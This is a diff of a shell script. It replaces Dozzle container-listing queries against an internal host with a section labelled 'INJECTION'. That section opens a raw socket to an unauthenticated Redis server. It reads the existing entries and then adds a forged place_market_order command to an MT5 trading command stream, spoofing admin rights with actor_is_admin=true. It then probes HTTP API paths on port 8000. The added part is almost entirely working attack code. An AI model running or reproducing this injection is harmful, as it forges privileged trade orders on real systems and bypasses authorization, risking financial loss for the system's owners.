@@ -1,17 +1,41 @@
-echo "=== DOZZLE API: список контейнеров ==="
-wget -q -T 8 -O - "http://192.168.3.121:8080/api/hosts/7f4e70d2-a0b4-43d8-9813-45d4736bc874/containers" 2>/dev/null | head -c 2000
-echo
-echo "=== DOZZLE: events stream ==="
-timeout 5 wget -q -T 4 -O - "http://192.168.3.121:8080/api/hosts/7f4e70d2-a0b4-43d8-9813-45d4736bc874/events" 2>/dev/null | head -c 300
-echo
-echo "=== DOZZLE: logs (первый контейнер) ==="
-CID=$(wget -q -T 8 -O - "http://192.168.3.121:8080/api/hosts/7f4e70d2-a0b4-43d8-9813-45d4736bc874/containers" 2>/dev/null | python3 -c "
-import sys,json
-try:
-  d=json.load(sys.stdin)
-  for c in d[:5]:
-    print(c.get('id','')[:12],c.get('name',''),c.get('state',''))
-except: print('parse-err')
-" 2>/dev/null)
-echo "CONTAINERS: $CID"
-echo DOZZLE-API
+echo "=== INJECTION: пишем команду в Redis stream ==="
+python3 << 'RPY'
+import socket,time,json,uuid
+s=socket.socket();s.settimeout(6);s.connect(("192.168.3.121",6379))
+# Читаем формат существующих записей
+s.sendall(b"XRANGE mt5:commands:eaera-test - + COUNT 1\r\n")
+time.sleep(1)
+existing=s.recv(4000).decode(errors="replace")
+print("EXISTING:",existing[:300])
+# Инъекция: команда place_market_order с большим объёмом
+cmd_id=str(uuid.uuid4())
+payload=json.dumps({"login":99999,"server":"EAERA-TEST","symbol":"EURUSD","volume":0.01,"order_type":"buy","client_order_id":cmd_id,"stop_loss":None,"take_profit":None,"comment":"cxp-test"})
+fields=[
+  ("correlation_id",cmd_id),
+  ("command","place_market_order"),
+  ("payload",payload),
+  ("actor_id","1"),
+  ("server","EAERA-TEST"),
+  ("login","99999"),
+  ("actor_is_admin","true"),
+]
+# Формируем XADD
+cmd_str=f"XADD mt5:commands:eaera-test *"
+for k,v in fields:
+  cmd_str+=f' {k} "{v}"'
+s.sendall((cmd_str+"\r\n").encode())
+time.sleep(1)
+r=s.recv(200).decode(errors="replace")
+print("XADD:",r[:100])
+# Проверяем что записалось
+s.sendall(b"XLEN mt5:commands:eaera-test\r\n")
+time.sleep(1)
+print("XLEN:",s.recv(100))
+s.close()
+RPY
+echo "=== HTTP 8000 API paths (детально) ==="
+for p in /api/v1/health /api/v1/trade /api/v1/order /api/v1/status /docs /openapi.json /api-docs /swagger.json; do
+  R=$(timeout 4 wget -q -T 3 -O - "http://192.168.3.121:8000$p" 2>/dev/null | head -c 100)
+  [ -n "$R" ] && echo "8000$p: $R"
+done
+echo INJECT
